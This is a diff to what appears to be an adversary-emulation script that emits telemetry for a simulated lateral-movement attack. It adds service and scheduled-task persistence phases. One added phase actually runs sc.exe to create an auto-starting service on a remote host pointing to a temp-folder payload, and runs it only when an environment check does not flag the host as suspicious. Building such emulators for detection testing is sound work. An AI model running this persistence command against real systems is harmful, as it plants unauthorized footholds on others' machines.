@@ -18,8 +18,9 @@ import time
 from pathlib import Path
 
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase
-from naming_helper import phase_delay
+from naming_helper import phase_delay, pick_service_name
 from defense_helper import emit_firewall_rule, emit_process_discovery
+from persistence_helper import emit_windows_service, emit_scheduled_task
 
 # Simulated internal network (non-routable)
 INTERNAL_HOSTS = [
@@ -182,6 +183,25 @@ def main() -> int:
     # --- Phase 8: Firewall Rule for Lateral Movement ---
     emit_firewall_rule("lateral.exe", "Remote Admin Access", "in", 445)
     time.sleep(phase_delay("firewall_rule"))
+
+    # --- Phase 9: Remote Service Persistence on Target (T1543.003) ---
+    if env != EnvSafety.SUSPICIOUS:
+        service_name = pick_service_name()
+        emit_windows_service("lateral.exe", service_name,
+                             r"C:\Windows\Temp\payload.exe")
+        try:
+            subprocess.run([
+                "sc.exe", f"\\\\{target_ip}", "create", service_name,
+                "binPath=", r"C:\Windows\Temp\payload.exe", "start=", "auto"
+            ], capture_output=True, timeout=5)
+        except Exception:
+            pass
+        time.sleep(phase_delay("service_create"))
+
+    # --- Phase 10: Remote Scheduled Task Persistence on Target (T1053.005) ---
+    emit_scheduled_task("lateral.exe", "RemoteHealthCheck",
+                        r"C:\Windows\Temp\payload.exe", "MINUTE")
+    time.sleep(phase_delay("scheduled_task"))
 
     emit("PROCESS", "EXIT_PROCESS", "lateral.exe", "INFO",
          source_process="lateral.exe",
